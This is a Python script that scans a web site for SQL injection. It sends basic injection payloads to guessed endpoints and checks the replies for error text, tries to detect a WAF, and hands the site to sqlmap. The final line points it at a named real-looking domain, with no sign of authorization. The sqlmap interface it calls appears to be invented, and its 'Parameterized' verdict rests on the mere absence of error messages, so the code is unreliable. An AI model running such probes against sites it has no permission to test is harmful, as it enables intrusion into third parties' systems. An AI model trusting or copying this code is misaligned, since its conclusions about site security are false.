import requests
import re
from sqlmap import sqlmapapi

def detect_sql_injection(url):
    session = requests.Session()
    
    payloads = ["'", "' OR 1=1 --", '" OR 1=1 --']
    test_endpoints = ['login', 'search', 'id']

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0'
    }
    
    injection_point = False
    for endpoint in test_endpoints:
        for payload in payloads:
            response = session.get(f"{url}/{endpoint}?input={payload}", headers=headers)
            if re.search(r'(sql|database|syntax|error)', response.text, re.IGNORECASE):
                injection_point = True
                break
        if injection_point:
            break
    
    if not injection_point:
        for payload in payloads:
            response = session.post(url, data={'input': payload}, headers=headers)
            if re.search(r'(sql|database|syntax|error)', response.text, re.IGNORECASE):
                injection_point = True
                break
    
    waf_detection_payload = "' OR 1=1 --"
    response = session.get(f"{url}/test?input={waf_detection_payload}", headers=headers)
    waf_detected = 'waf' in response.headers.get('Server', '').lower()
    
    sqlmap_task = sqlmapapi.SQLMapAPI()
    sqlmap_task.start_task(apiurl=url)
    result = sqlmap_task.scan(payload=url)
                
    return {
        'Parameterized': not injection_point,
        'WAF': waf_detected,
        'SQL Injection vulnerable': injection_point,
        'sqlmap_result': result
    }

results = detect_sql_injection("http://pointlessai.com")
print(results)
